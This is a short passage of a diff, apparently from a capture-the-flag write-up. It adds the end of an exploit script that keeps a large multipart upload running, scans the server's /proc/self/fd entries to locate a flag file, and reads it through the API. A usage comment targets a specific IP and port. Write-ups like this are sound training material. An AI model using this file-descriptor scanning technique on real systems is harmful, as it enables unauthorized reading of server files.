+            raise RuntimeError(f"upload did not start: {upload_state}")
+        time.sleep(0.05)
+
+    print("[*] Large multipart upload in progress, scanning /proc/self/fd/* ...")
+    flag_file, hit_fd = find_flag_filename(
+        base_url=base_url,
+        api_key=api_key,
+        fd_start=args.fd_start,
+        fd_end=args.fd_end,
+        scan_rounds=args.scan_rounds,
+    )
+    print(f"[+] Flag file: {flag_file} (via fd {hit_fd})")
+
+    flag = read_flag(base_url, api_key, flag_file)
+    print(f"[+] Flag: {flag}")
+
+    upload_thread.join(timeout=1)
+    if upload_state.get("error"):
+        print(f"[!] Upload thread error after success: {upload_state['error']}")
+
+
+if __name__ == "__main__":
+    main()
+
+
+# python3 exp.py 223.6.249.127:54789
 ```
 
 # Misc
